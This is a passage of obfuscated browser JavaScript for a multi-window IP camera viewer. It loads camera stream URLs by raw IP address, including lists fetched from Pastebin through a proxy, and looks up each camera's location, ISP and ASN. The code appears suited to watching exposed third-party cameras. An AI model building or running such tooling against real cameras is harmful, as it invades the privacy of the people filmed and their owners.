_0x2fb0ce=_0x3b3a79;if(!_0x1540f2)return;_0xeea590=_0xeea590||window['event'],_0xeea590[_0x2fb0ce(0x345)](),_0x2dd205=_0x27fd71-_0xeea590[_0x2fb0ce(0x3bb)],_0x4e9d06=_0x4fa3ae-_0xeea590[_0x2fb0ce(0x47c)],_0x27fd71=_0xeea590[_0x2fb0ce(0x3bb)],_0x4fa3ae=_0xeea590['clientY'];const _0x3dc174=_0x3eba67['offsetTop']-_0x4e9d06,_0x3534d8=_0x3eba67[_0x2fb0ce(0x460)]-_0x2dd205;_0x3eba67[_0x2fb0ce(0x270)][_0x2fb0ce(0x132)]=_0x3dc174+'px',_0x3eba67[_0x2fb0ce(0x270)][_0x2fb0ce(0x173)]=_0x3534d8+'px';}function _0x3f53e4(){const _0x300409=_0x3b3a79;document[_0x300409(0x308)]=null,document[_0x300409(0x496)]=null,_0x1540f2=![],_0x3eba67[_0x300409(0x272)][_0x300409(0x294)](_0x300409(0x43b));}},setupWindowControls=_0xbdd378=>{const _0x103f97=_0x5d7fa7;if(!_0xbdd378)return;const _0xfa05e1=_0xbdd378['querySelector'](_0x103f97(0x227));_0xfa05e1&&_0xfa05e1['addEventListener'](_0x103f97(0x2bd),()=>{const _0x60b11=_0xbdd378['querySelector']('.window-content');_0x60b11&&_0x60b11['classList']['toggle']('minimized');});const _0x47a746=_0xbdd378[_0x103f97(0x3b0)](_0x103f97(0x1de));_0x47a746&&_0x47a746[_0x103f97(0x28f)]('click',()=>{const _0x29c2a3=_0x103f97,_0x5d9f26=_0x47a746[_0x29c2a3(0x3b0)]('i');_0xbdd378[_0x29c2a3(0x272)][_0x29c2a3(0x2c6)](_0x29c2a3(0x19e));if(_0xbdd378[_0x29c2a3(0x272)][_0x29c2a3(0x26b)]('maximized')){_0xbdd378[_0x29c2a3(0x1d4)][_0x29c2a3(0x23a)]=_0xbdd378['style']['top'],_0xbdd378[_0x29c2a3(0x1d4)][_0x29c2a3(0x35d)]=_0xbdd378[_0x29c2a3(0x270)][_0x29c2a3(0x173)],_0xbdd378[_0x29c2a3(0x1d4)][_0x29c2a3(0x40f)]=_0xbdd378[_0x29c2a3(0x270)][_0x29c2a3(0x219)],_0xbdd378[_0x29c2a3(0x1d4)][_0x29c2a3(0x490)]=_0xbdd378['style'][_0x29c2a3(0x43a)],_0xbdd378[_0x29c2a3(0x1d4)][_0x29c2a3(0x157)]=_0xbdd378[_0x29c2a3(0x270)]['zIndex'],_0x5d9f26[_0x29c2a3(0x272)][_0x29c2a3(0x294)](_0x29c2a3(0x2e8)),_0x5d9f26[_0x29c2a3(0x272)][_0x29c2a3(0x3dc)](_0x29c2a3(0x289)),_0xbdd378[_0x29c2a3(0x270)][_0x29c2a3(0x132)]='0',_0xbdd378[_0x29c2a3(0x270)][_0x29c2a3(0x173)]='0',_0xbdd378[_0x29c2a3(0x270)][_0x29c2a3(0x219)]='100%',_0xbdd378[_0x29c2a3(0x270)][_0x29c2a3(0x43a)]=_0x29c2a3(0x38d);const _0x1d73f5=Math[_0x29c2a3(0x40e)](0x3e8,...Array[_0x29c2a3(0x290)](document[_0x29c2a3(0x416)](_0x29c2a3(0x2c3)))['map'](_0x1ae22c=>parseInt(getComputedStyle(_0x1ae22c)[_0x29c2a3(0x13e)])||0x0))+0xa;_0xbdd378[_0x29c2a3(0x270)]['zIndex']=_0x1d73f5;}else _0x5d9f26['classList'][_0x29c2a3(0x294)]('fa-compress'),_0x5d9f26[_0x29c2a3(0x272)]['add'](_0x29c2a3(0x2e8)),_0xbdd378['style'][_0x29c2a3(0x132)]=_0xbdd378[_0x29c2a3(0x1d4)][_0x29c2a3(0x23a)]||'',_0xbdd378[_0x29c2a3(0x270)][_0x29c2a3(0x173)]=_0xbdd378[_0x29c2a3(0x1d4)]['prevLeft']||'',_0xbdd378[_0x29c2a3(0x270)][_0x29c2a3(0x219)]=_0xbdd378[_0x29c2a3(0x1d4)][_0x29c2a3(0x40f)]||'',_0xbdd378[_0x29c2a3(0x270)][_0x29c2a3(0x43a)]=_0xbdd378[_0x29c2a3(0x1d4)]['prevHeight']||'',_0xbdd378[_0x29c2a3(0x270)][_0x29c2a3(0x13e)]=_0xbdd378['dataset'][_0x29c2a3(0x157)]||'',_0xbdd378[_0x29c2a3(0x270)][_0x29c2a3(0x30d)]='';});const _0x514fbc=_0xbdd378[_0x103f97(0x3b0)](_0x103f97(0x2cf));_0x514fbc&&_0x514fbc[_0x103f97(0x28f)](_0x103f97(0x2bd),()=>{const _0x25061e=_0x103f97;_0xbdd378[_0x25061e(0x272)][_0x25061e(0x3dc)]('closing'),setTimeout(()=>{const _0x1fb7c3=_0x25061e;_0xbdd378['remove']();if(_0xbdd378['id']===_0x1fb7c3(0x213)){globalState[_0x1fb7c3(0x3ef)]=![];return;}const _0x1cc71d=_0xbdd378[_0x1fb7c3(0x1d4)]['id'];globalState['activeWindows']=globalState[_0x1fb7c3(0x14c)][_0x1fb7c3(0x3d4)](_0xbaa78a=>_0xbaa78a!==_0x1cc71d),_0x1cc71d&&globalState[_0x1fb7c3(0x43c)][_0x1cc71d]&&(globalState[_0x1fb7c3(0x43c)][_0x1cc71d][_0x1fb7c3(0x1af)][_0x1fb7c3(0x20c)](),globalState[_0x1fb7c3(0x43c)][_0x1cc71d][_0x1fb7c3(0x4a5)]&&clearTimeout(globalState[_0x1fb7c3(0x43c)][_0x1cc71d][_0x1fb7c3(0x4a5)]),delete globalState[_0x1fb7c3(0x43c)][_0x1cc71d]),globalState['advancedMode']&&updateDashboardContent();},0x12c);});},setupTabs=_0x9a310d=>{const _0x50e938=_0x5d7fa7;if(!_0x9a310d)return;const _0x2bbaf1=_0x9a310d[_0x50e938(0x416)](_0x50e938(0x231));_0x2bbaf1[_0x50e938(0x222)](_0x1664c8=>{const _0x155564=_0x50e938;_0x1664c8[_0x155564(0x28f)](_0x155564(0x2bd),()=>{const _0x243f94=_0x155564;_0x9a310d[_0x243f94(0x416)](_0x243f94(0x231))[_0x243f94(0x222)](_0x2d6ab9=>_0x2d6ab9[_0x243f94(0x272)][_0x243f94(0x294)](_0x243f94(0x22e))),_0x9a310d[_0x243f94(0x416)](_0x243f94(0x3b9))[_0x243f94(0x222)](_0x46504e=>_0x46504e[_0x243f94(0x272)][_0x243f94(0x294)](_0x243f94(0x22e))),_0x1664c8[_0x243f94(0x272)]['add'](_0x243f94(0x22e));const _0x1482ff=_0x1664c8[_0x243f94(0x1d4)]['tab'],_0x19e850=_0x9a310d[_0x243f94(0x3b0)]('#'+_0x1482ff);_0x19e850&&_0x19e850[_0x243f94(0x272)][_0x243f94(0x3dc)](_0x243f94(0x22e));});});},addCamera=_0x24428b=>{const _0xda3e4=_0x5d7fa7;if(globalState[_0xda3e4(0x2b4)][_0xda3e4(0x1b6)](_0x24428b))return console[_0xda3e4(0x401)](_0xda3e4(0x38b)),![];globalState[_0xda3e4(0x2b4)][_0xda3e4(0x3a7)](_0x24428b);const _0x20a481=createElementWithHTML('li',_0xda3e4(0x215)+_0x24428b,_0xda3e4(0x2cb));return _0x20a481[_0xda3e4(0x28f)]('click',()=>openVideoWindow(_0x24428b)),DOM['get'](_0xda3e4(0x3d2))['appendChild'](_0x20a481),updateCameraCount(),!![];};document[_0x5d7fa7(0x1e8)](_0x5d7fa7(0x285))['addEventListener'](_0x5d7fa7(0x1e5),_0x716c20=>{const _0x86e181=_0x5d7fa7;_0x716c20[_0x86e181(0x345)]();const _0xd20708=document[_0x86e181(0x1e8)](_0x86e181(0x2f5))['value']['trim'](),_0x33ee9c=/^rtsp:\/\/(:\S*)?@?(\d{1,3}\.){3}\d{1,3}:\d{1,5}(\/.*)?$/,_0x45b813=/^https?:\/\/(:\S*)?@?(\d{1,3}\.){3}\d{1,3}(:\d{1,5})?(\/.*)?$/;if(!_0x33ee9c[_0x86e181(0x422)](_0xd20708)&&!_0x45b813['test'](_0xd20708)){alert(_0x86e181(0x2ab));return;}addCamera(_0xd20708)&&(document[_0x86e181(0x1e8)](_0x86e181(0x2f5))['value']='');});const fetchPastebinContent=async _0x104397=>{const _0x1b6712=_0x5d7fa7;try{const _0x15968a=new AbortController(),_0x39c08b=setTimeout(()=>_0x15968a[_0x1b6712(0x149)](),0x2710),_0x466c7d=await fetch(API_ENDPOINTS['CORS_PROXY'],{'method':_0x1b6712(0x48c),'headers':{'Content-Type':_0x1b6712(0x4a2)},'body':JSON[_0x1b6712(0x1a8)]({'url':_0x104397}),'signal':_0x15968a[_0x1b6712(0x455)]});clearTimeout(_0x39c08b);if(!_0x466c7d['ok']){const _0xb8c3d1=await _0x466c7d[_0x1b6712(0x143)]();throw new Error(_0x1b6712(0x2e0)+_0x466c7d[_0x1b6712(0x49f)]+_0x1b6712(0x254)+_0xb8c3d1);}const _0x308244=await _0x466c7d[_0x1b6712(0x187)]();if(!_0x308244||!_0x308244['contents'])throw new Error(_0x1b6712(0x21d));return _0x308244['contents'];}catch(_0x467e96){if(_0x467e96[_0x1b6712(0x25b)]===_0x1b6712(0x18b))return console[_0x1b6712(0x473)](_0x1b6712(0x3e6)),'';return console[_0x1b6712(0x473)](_0x1b6712(0x1ad),_0x467e96),'';}};function showLoadingMessage(_0x32e90a){const _0x9173ec=_0x5d7fa7;let _0x147186=document[_0x9173ec(0x1e8)](_0x9173ec(0x481));_0x32e90a?(!_0x147186&&(_0x147186=document['createElement'](_0x9173ec(0x1df)),_0x147186['id']=_0x9173ec(0x481),_0x147186[_0x9173ec(0x259)]=_0x9173ec(0x481),_0x147186['innerHTML']=_0x9173ec(0x3f9),document[_0x9173ec(0x27f)][_0x9173ec(0x301)](_0x147186)),_0x147186[_0x9173ec(0x272)][_0x9173ec(0x3dc)](_0x9173ec(0x18a))):_0x147186&&(_0x147186['classList']['remove']('visible'),_0x147186[_0x9173ec(0x3bf)]&&_0x147186['parentNode']['removeChild'](_0x147186));}const updateCameraListFromPastebin=async _0xacbc62=>{const _0xe5122c=_0x5d7fa7;showLoadingMessage(!![]);const _0x1f0165=setTimeout(()=>{showLoadingMessage(![]);},0x2710);try{const _0x4a7339=await fetchPastebinContent(_0xacbc62),_0x126ad9=_0x4a7339['split']('\x0a')['filter'](_0x20244d=>_0x20244d['trim']()!=='');DOM['get'](_0xe5122c(0x3d2))['innerHTML']='',globalState[_0xe5122c(0x2b4)]=[],_0x126ad9[_0xe5122c(0x222)](_0x27d6a1=>{addCamera(_0x27d6a1);}),updateCameraCount();}catch(_0x2d9357){console[_0xe5122c(0x473)](_0xe5122c(0x1e6),_0x2d9357);}finally{clearTimeout(_0x1f0165),showLoadingMessage(![]);}},isMjpgStream=_0x105b92=>{const _0x45639a=_0x5d7fa7;return _0x105b92[_0x45639a(0x261)]()[_0x45639a(0x1b6)](_0x45639a(0x42b))||_0x105b92[_0x45639a(0x261)]()[_0x45639a(0x1b6)]('mjpg/video')||_0x105b92[_0x45639a(0x261)]()[_0x45639a(0x1b6)](_0x45639a(0x419))||_0x105b92[_0x45639a(0x261)]()[_0x45639a(0x1b6)](_0x45639a(0x325));},formatMjpgUrl=_0x364a7c=>{const _0x401e56=_0x5d7fa7;if(isMjpgStream(_0x364a7c))return _0x364a7c;const _0x1eff81=_0x364a7c[_0x401e56(0x156)]('/')?_0x364a7c[_0x401e56(0x49a)](0x0,-0x1):_0x364a7c;return _0x1eff81+_0x401e56(0x41c);},createStreamedianPlayer=(_0x30be18,_0x42b54c)=>{const _0x2871a2=_0x5d7fa7,_0x1b037e=document[_0x2871a2(0x21c)](_0x2871a2(0x131));return _0x1b037e[_0x2871a2(0x259)]=_0x2871a2(0x380),_0x1b037e['frameBorder']='0',_0x1b037e['allowFullscreen']='1',_0x1b037e[_0x2871a2(0x309)]=_0x2871a2(0x42f)+btoa(_0x30be18)+'&r='+btoa(_0x42b54c),_0x1b037e['width']=_0x2871a2(0x38d),_0x1b037e[_0x2871a2(0x43a)]=_0x2871a2(0x38d),_0x1b037e;},createFlashphonerPlayer=_0x55a5c1=>{const _0x566de3=_0x5d7fa7,_0x12e743=document[_0x566de3(0x21c)](_0x566de3(0x131));_0x12e743[_0x566de3(0x259)]=_0x566de3(0x380),_0x12e743['id']=_0x566de3(0x316),_0x12e743[_0x566de3(0x1b8)]='0',_0x12e743['marginWidth']='0',_0x12e743[_0x566de3(0x32e)]='0',_0x12e743[_0x566de3(0x151)]=_0x566de3(0x478),_0x12e743['width']=_0x566de3(0x38d),_0x12e743['height']=_0x566de3(0x38d),_0x12e743[_0x566de3(0x321)]='no';const _0x18889b=_0x55a5c1[_0x566de3(0x250)](/[\r\n]+/g,''),_0x5ccb7c=_0x566de3(0x2e7),_0x2b2692=encodeURIComponent(JSON['stringify']({'iceServers':[{'urls':[_0x566de3(0x395)]}],'sdpSemantics':_0x566de3(0x234),'bundlePolicy':_0x566de3(0x15b)})),_0x5023b9=new URLSearchParams({'urlServer':_0x5ccb7c,'streamName':_0x18889b,'mediaProviders':_0x566de3(0x276),'rtcConfig':_0x2b2692,'useWorker':'true','receiverType':_0x566de3(0x1a2)});return _0x12e743[_0x566de3(0x309)]='https://demo.flashphoner.com:8888/embed_player?'+_0x5023b9[_0x566de3(0x14f)](),_0x12e743['allow']=_0x566de3(0x368),_0x12e743;},openVideoWindow=_0x10d93a=>{const _0x47fbe7=_0x5d7fa7;console['log']('[openVideoWindow]\x20Opening\x20video\x20window\x20for\x20URL:',_0x10d93a);const _0x31f049=_0x47fbe7(0x3f1)+Date['now']();console[_0x47fbe7(0x401)]('[openVideoWindow]\x20Generated\x20window\x20ID:',_0x31f049);const _0x307632=document['getElementById'](_0x47fbe7(0x414)),_0x51991=_0x307632[_0x47fbe7(0x3a9)][_0x47fbe7(0x2e2)](!![])[_0x47fbe7(0x3b0)](_0x47fbe7(0x2c3));_0x51991[_0x47fbe7(0x1d4)]['id']=_0x31f049,_0x51991[_0x47fbe7(0x1d4)][_0x47fbe7(0x134)]=_0x10d93a,console[_0x47fbe7(0x401)](_0x47fbe7(0x28c),_0x51991[_0x47fbe7(0x1d4)]),_0x51991[_0x47fbe7(0x3b0)](_0x47fbe7(0x305))['textContent']=_0x10d93a;const _0x5d6b61=0x14*(globalState[_0x47fbe7(0x14c)][_0x47fbe7(0x326)]%0x5);_0x51991[_0x47fbe7(0x270)]['top']=0x46+_0x5d6b61+'px',_0x51991[_0x47fbe7(0x270)][_0x47fbe7(0x173)]=0x15e+_0x5d6b61+'px',globalState[_0x47fbe7(0x14c)]['push'](_0x31f049);const _0x23b3d7=_0x51991[_0x47fbe7(0x3b0)]('.video-container');document[_0x47fbe7(0x27f)][_0x47fbe7(0x301)](_0x51991),_0x51991[_0x47fbe7(0x270)]['width']=_0x47fbe7(0x470),_0x51991['style']['height']=_0x47fbe7(0x177);if(isMjpgStream(_0x10d93a)){const _0x39282a=formatMjpgUrl(_0x10d93a),_0x3dce8f=document['createElement']('iframe');_0x3dce8f[_0x47fbe7(0x259)]=_0x47fbe7(0x380),_0x3dce8f[_0x47fbe7(0x1b8)]='0',_0x3dce8f['width']=_0x47fbe7(0x38d),_0x3dce8f['height']=_0x47fbe7(0x38d),_0x3dce8f[_0x47fbe7(0x309)]=_0x39282a,_0x3dce8f['allowFullscreen']=!![],_0x23b3d7['appendChild'](_0x3dce8f);}else{let _0x52b3ca=globalState[_0x47fbe7(0x354)]?calculateOptimalResolution(_0x23b3d7['clientWidth'],_0x23b3d7[_0x47fbe7(0x355)]):globalState[_0x47fbe7(0x2db)];if(!_0x52b3ca)_0x52b3ca=_0x47fbe7(0x275);const _0xed4da4=_0x51991[_0x47fbe7(0x3b0)]('.stream-resolution');_0xed4da4&&(_0xed4da4[_0x47fbe7(0x43f)]=_0x52b3ca);const _0x1208d3=_0x51991[_0x47fbe7(0x416)](_0x47fbe7(0x238));_0x1208d3[_0x47fbe7(0x222)](_0x5a6b3d=>{const _0x490f3a=_0x47fbe7;_0x5a6b3d&&(_0x5a6b3d['value']=globalState['playerPreference'],_0x5a6b3d[_0x490f3a(0x28f)](_0x490f3a(0x3ce),_0x48a39a=>{const _0x17ea75=_0x490f3a;globalState[_0x17ea75(0x245)]=_0x48a39a[_0x17ea75(0x2ba)][_0x17ea75(0x1a5)],_0x1208d3[_0x17ea75(0x222)](_0x3bbccc=>{const _0x251bdd=_0x17ea75;_0x3bbccc[_0x251bdd(0x1a5)]=_0x48a39a[_0x251bdd(0x2ba)]['value'];}),updateRtspStreamResolution(_0x51991,_0x10d93a,_0x52b3ca),showNotification('<i\x20class=\x22fas\x20fa-exchange-alt\x22></i>\x20Switched\x20to\x20'+_0x48a39a[_0x17ea75(0x2ba)]['value']+'\x20player');}));});const _0x3ed26b=globalState[_0x47fbe7(0x245)]===_0x47fbe7(0x16f)?createStreamedianPlayer(_0x10d93a,_0x52b3ca):createFlashphonerPlayer(_0x10d93a);_0x23b3d7['appendChild'](_0x3ed26b),globalState['autoResolution']&&setupResizeObserver(_0x51991,_0x23b3d7,_0x10d93a);}setupWindowControls(_0x51991),makeDraggable(_0x51991,_0x51991[_0x47fbe7(0x3b0)](_0x47fbe7(0x2b2))),makeResizable(_0x51991),setupTabsInWindow(_0x51991);const _0x17d22d=extractIpFromUrl(_0x10d93a);_0x17d22d&&fetchIPInfo(_0x17d22d,_0x51991);globalState[_0x47fbe7(0x3ef)]&&(updateDashboardContent(),populateCurrentIpSelector());const _0x2558d4=_0x51991[_0x47fbe7(0x3b0)](_0x47fbe7(0x2d7));return _0x2558d4&&(console[_0x47fbe7(0x401)](_0x47fbe7(0x3f7)),_0x2558d4[_0x47fbe7(0x28f)](_0x47fbe7(0x2bd),_0x4023c7=>{const _0x154247=_0x47fbe7;_0x4023c7[_0x154247(0x345)](),console[_0x154247(0x401)](_0x154247(0x166));const _0x4d5cc9=_0x4023c7['target'][_0x154247(0x2d5)](_0x154247(0x2c3));console[_0x154247(0x401)]('Window\x20element\x20from\x20button\x20click:',_0x4d5cc9);if(_0x4d5cc9){console[_0x154247(0x401)](_0x154247(0x35e));const _0x394465=_0x4d5cc9['querySelector']('.metadata-loading');_0x394465&&(_0x394465[_0x154247(0x270)][_0x154247(0x252)]=_0x154247(0x31e));try{const _0xab17b3=extractCameraMetadata(_0x4d5cc9);console[_0x154247(0x401)](_0x154247(0x1ba),_0xab17b3),_0xab17b3[_0x154247(0x353)]?showNotification(_0x154247(0x1e7),_0x154247(0x353)):showNotification(_0x154247(0x410)+_0xab17b3[_0x154247(0x473)],_0x154247(0x473));}catch(_0x21cd0c){console[_0x154247(0x473)](_0x154247(0x2e4),_0x21cd0c),showNotification(_0x154247(0x3af)+_0x21cd0c[_0x154247(0x209)],'error');}finally{_0x394465&&(_0x394465[_0x154247(0x270)][_0x154247(0x252)]=_0x154247(0x3b1));}}else console[_0x154247(0x473)](_0x154247(0x494)),showNotification(_0x154247(0x494),_0x154247(0x473));})),_0x51991;},setupTabsInWindow=_0x55bfb5=>{const _0x29a1fc=_0x5d7fa7;if(!_0x55bfb5)return;const _0x2eb85d=_0x55bfb5[_0x29a1fc(0x416)]('.tab-button'),_0x2b3ad6=_0x55bfb5[_0x29a1fc(0x416)]('.tab-content');_0x2eb85d['forEach'](_0xf3dd82=>{const _0x199e63=_0x29a1fc;_0xf3dd82[_0x199e63(0x28f)](_0x199e63(0x2bd),()=>{const _0x4e579f=_0x199e63;_0x2eb85d[_0x4e579f(0x222)](_0x388eaf=>_0x388eaf[_0x4e579f(0x272)]['remove'](_0x4e579f(0x22e))),_0x2b3ad6[_0x4e579f(0x222)](_0x3cff24=>_0x3cff24['classList']['remove'](_0x4e579f(0x22e))),_0xf3dd82['classList'][_0x4e579f(0x3dc)]('active');const _0x461715=_0xf3dd82[_0x4e579f(0x1d4)][_0x4e579f(0x220)],_0x140a34=_0x55bfb5[_0x4e579f(0x3b0)]('#'+_0x461715);_0x140a34&&_0x140a34[_0x4e579f(0x272)][_0x4e579f(0x3dc)](_0x4e579f(0x22e));});});},makeResizable=_0x2d6977=>{const _0x509183=_0x5d7fa7;if(!_0x2d6977)return;const _0x11d357=['se','sw','ne','nw','n','s','e','w'];_0x11d357[_0x509183(0x222)](_0x26f84f=>{const _0x13155c=_0x509183,_0x1354ee='resize-handle\x20resize-'+_0x26f84f;if(!_0x2d6977[_0x13155c(0x3b0)]('.'+_0x1354ee[_0x13155c(0x23c)]('\x20')[0x1])){const _0x2674f2=document[_0x13155c(0x21c)]('div');_0x2674f2[_0x13155c(0x259)]=_0x1354ee,_0x2d6977['appendChild'](_0x2674f2),_0x2674f2['addEventListener'](_0x13155c(0x1a3),_0x1ff0e8=>{const _0x1aa2ec=_0x13155c;_0x1ff0e8[_0x1aa2ec(0x345)](),startResize(_0x1ff0e8,_0x2d6977,_0x26f84f);});}});},startResize=(_0x5152b1,_0x37e9a3,_0x455052)=>{const _0x96b7ea=_0x5d7fa7;_0x5152b1[_0x96b7ea(0x2f1)]();const _0x58dd04=_0x5152b1[_0x96b7ea(0x3bb)],_0x15efd9=_0x5152b1[_0x96b7ea(0x47c)],_0xc0b252=_0x37e9a3[_0x96b7ea(0x372)],_0x17f89f=_0x37e9a3[_0x96b7ea(0x415)],_0x39b345=_0x37e9a3[_0x96b7ea(0x462)],_0x434646=_0x37e9a3[_0x96b7ea(0x460)],_0xf1fcad=0x140,_0x52da5f=0xf0,_0x1ddb48=_0x1a745f=>{const _0x5153c9=_0x96b7ea,_0x3305d=Math[_0x5153c9(0x40e)](...Array[_0x5153c9(0x290)](document[_0x5153c9(0x416)](_0x5153c9(0x2c3)))[_0x5153c9(0x3d5)](_0x32fc75=>parseInt(getComputedStyle(_0x32fc75)[_0x5153c9(0x13e)])||0x0));_0x37e9a3[_0x5153c9(0x270)]['zIndex']=_0x3305d+0x1;let _0x196b19=_0xc0b252,_0xfc7d1=_0x17f89f,_0x2b4b89=_0x39b345,_0x3e371c=_0x434646;const _0x4154d6=_0x1a745f['clientX']-_0x58dd04,_0xd37dac=_0x1a745f[_0x5153c9(0x47c)]-_0x15efd9;if(_0x455052['includes']('e'))_0x196b19=Math[_0x5153c9(0x40e)](_0xf1fcad,_0xc0b252+_0x4154d6);if(_0x455052[_0x5153c9(0x1b6)]('s'))_0xfc7d1=Math['max'](_0x52da5f,_0x17f89f+_0xd37dac);_0x455052['includes']('w')&&(_0x196b19=Math[_0x5153c9(0x40e)](_0xf1fcad,_0xc0b252-_0x4154d6),_0x3e371c=_0x434646+_0xc0b252-_0x196b19),_0x455052[_0x5153c9(0x1b6)]('n')&&(_0xfc7d1=Math['max'](_0x52da5f,_0x17f89f-_0xd37dac),_0x2b4b89=_0x39b345+_0x17f89f-_0xfc7d1),_0x37e9a3[_0x5153c9(0x270)][_0x5153c9(0x219)]=_0x196b19+'px',_0x37e9a3['style']['height']=_0xfc7d1+'px',_0x37e9a3[_0x5153c9(0x270)][_0x5153c9(0x132)]=_0x2b4b89+'px',_0x37e9a3[_0x5153c9(0x270)][_0x5153c9(0x173)]=_0x3e371c+'px';},_0x2ca954=()=>{const _0x1801b5=_0x96b7ea;window['removeEventListener'](_0x1801b5(0x451),_0x1ddb48),window[_0x1801b5(0x49e)](_0x1801b5(0x2e1),_0x2ca954);};window[_0x96b7ea(0x28f)]('mousemove',_0x1ddb48),window[_0x96b7ea(0x28f)](_0x96b7ea(0x2e1),_0x2ca954);};async function fetchIPInfo(_0x2752d1,_0x45abf9){const _0x2e27ce=_0x5d7fa7;if(!_0x2752d1||!_0x45abf9)return;const _0x45bd45=_0x45abf9[_0x2e27ce(0x1d4)]['id'];if(!_0x45bd45)return;const _0x1d7e42=_0x45abf9[_0x2e27ce(0x3b0)](_0x2e27ce(0x459));_0x1d7e42&&(_0x1d7e42['innerHTML']=_0x2e27ce(0x3c1));const _0x460cdf=setTimeout(()=>{const _0x33f567=_0x2e27ce;_0x1d7e42&&(_0x1d7e42[_0x33f567(0x2af)]='<div\x20class=\x22error-message\x22><i\x20class=\x22fas\x20fa-exclamation-triangle\x22></i>\x20Error:\x20IP\x20info\x20request\x20timed\x20out.</div>');},0x3a98);try{const _0xe31c5a=''+API_ENDPOINTS[_0x2e27ce(0x287)]+_0x2752d1+'?fields='+API_ENDPOINTS['IP_INFO_FIELDS'];console['log'](_0x2e27ce(0x28d)+_0xe31c5a);const _0x2deb60=new AbortController(),_0x87e3d=setTimeout(()=>_0x2deb60[_0x2e27ce(0x149)](),0x2710),_0x57b0d4=await fetch(API_ENDPOINTS[_0x2e27ce(0x228)],{'method':_0x2e27ce(0x48c),'headers':{'Content-Type':'application/json'},'body':JSON['stringify']({'url':_0xe31c5a}),'signal':_0x2deb60['signal']});clearTimeout(_0x87e3d);if(!_0x57b0d4['ok']){const _0x4c0ffd=await _0x57b0d4['text']();throw new Error(_0x2e27ce(0x2e0)+_0x57b0d4[_0x2e27ce(0x49f)]+_0x2e27ce(0x254)+_0x4c0ffd);}const _0xfb70e7=await _0x57b0d4[_0x2e27ce(0x187)]();if(!_0xfb70e7||!_0xfb70e7[_0x2e27ce(0x39c)])throw new Error(_0x2e27ce(0x487));const _0x23ca51=JSON[_0x2e27ce(0x3e0)](_0xfb70e7[_0x2e27ce(0x39c)]);if(!_0x23ca51||!_0x23ca51['query'])throw new Error(_0x2e27ce(0x385));clearTimeout(_0x460cdf),globalState['rawData'][_0x2e27ce(0x418)][_0x45bd45]=_0x23ca51;const _0x1baead=_0x45abf9[_0x2e27ce(0x3b0)]('.raw-ip-data');_0x1baead&&(_0x1baead[_0x2e27ce(0x43f)]=JSON[_0x2e27ce(0x1a8)](_0x23ca51,null,0x2)),updateIPInfoUI(_0x23ca51,_0x45abf9),_0x23ca51[_0x2e27ce(0x178)]&&fetchAndUpdateASN(_0x23ca51[_0x2e27ce(0x178)],_0x45abf9),globalState[_0x2e27ce(0x3ef)]&&(updateDashboardContent(),globalState[_0x2e27ce(0x433)]===_0x45bd45&&updateCurrentIpDisplay());}catch(_0x1eade3){console[_0x2e27ce(0x473)](_0x2e27ce(0x444),_0x1eade3),clearTimeout(_0x460cdf),_0x1d7e42&&(_0x1d7e42[_0x2e27ce(0x2af)]=_0x2e27ce(0x35f)+(_0x1eade3[_0x2e27ce(0x209)]||_0x2e27ce(0x2d4))+'</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20');}}async function fetchAndUpdateASN(_0xe26884,_0x542f10){const _0x42a449=_0x5d7fa7;if(!_0xe26884||!_0x542f10)return;const _0xf26e9a=_0x542f10[_0x42a449(0x1d4)]['id'];if(!_0xf26e9a)return;try{const _0x3f1fac=''+API_ENDPOINTS[_0x42a449(0x476)]+_0xe26884+_0x42a449(0x273);console[_0x42a449(0x401)](_0x42a449(0x34c)+_0x3f1fac);const _0x46f412=new AbortController(),_0x4a4029=setTimeout(()=>_0x46f412[_0x42a449(0x149)](),0x2710),_0x250fd5=await fetch(API_ENDPOINTS[_0x42a449(0x228)],{'method':'POST','headers':{'Content-Type':_0x42a449(0x4a2)},'body':JSON[_0x42a449(0x1a8)]({'url':_0x3f1fac}),'signal':_0x46f412[_0x42a449(0x455)]});clearTimeout(_0x4a4029);if(!_0x250fd5['ok'])throw new Error('HTTP\x20error!\x20Status:\x20'+_0x250fd5[_0x42a449(0x49f)]);const _0x35e504=await _0x250fd5[_0x42a449(0x187)]();if(!_0x35e504||!_0x35e504['contents'])throw new Error(_0x42a449(0x487));const _0x5565eb=JSON['parse'](_0x35e504['contents']);globalState[_0x42a449(0x333)][_0x42a449(0x1fd)][_0xf26e9a]=_0x5565eb;const _0x52f1b7=_0x542f10[_0x42a449(0x3b0)](_0x42a449(0x485));_0x52f1b7&&(_0x52f1b7['textContent']=JSON['stringify'](_0x5565eb,null,0x2)),globalState[_0x42a449(0x3ef)]&&(updateDashboardContent(),globalState['currentSelectedCamera']===_0xf26e9a&&updateCurrentIpDisplay());}catch(_0x4a6d68){console['error']('Error\x20fetching\x20ASN\x20info:',_0x4a6d68);}}const updateIPInfoUI=(_0x36363a,_0x3d2108)=>{const _0x2379a3=_0x5d7fa7;if(!_0x36363a||!_0x3d2108)return;const _0x1a80c8=_0x3d2108['dataset']['id'];if(!_0x1a80c8)return;const _0x2df365=_0x3d2108['querySelector'](_0x2379a3(0x197));_0x2df365&&_0x36363a['city']&&_0x36363a['country']&&(_0x2df365[_0x2379a3(0x43f)]=_0x36363a[_0x2379a3(0x2f2)]+',\x20'+_0x36363a['country']);const _0x12fde7=_0x3d2108[_0x2379a3(0x3b0)](_0x2379a3(0x459));if(_0x12fde7){const _0x1f4d1e=_0x36363a[_0x2379a3(0x1c3)]||_0x36363a[_0x2379a3(0x2bf)],_0x3a3f8c=_0x1f4d1e?_0x2379a3(0x236):'security-safe';_0x12fde7['innerHTML']='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22ip-header\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22location-name\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<i\x20class=\x22fas\x20fa-map-marker-alt\x22></i>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span>'+(_0x36363a[_0x2379a3(0x2f2)]||'Unknown')+',\x20'+(_0x36363a[_0x2379a3(0x2dc)]||'')+',\x20'+(_0x36363a['country']||_0x2379a3(0x37a))+_0x2379a3(0x2ec)+(_0x36363a[_0x2379a3(0x178)]||_0x2379a3(0x327))+'</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\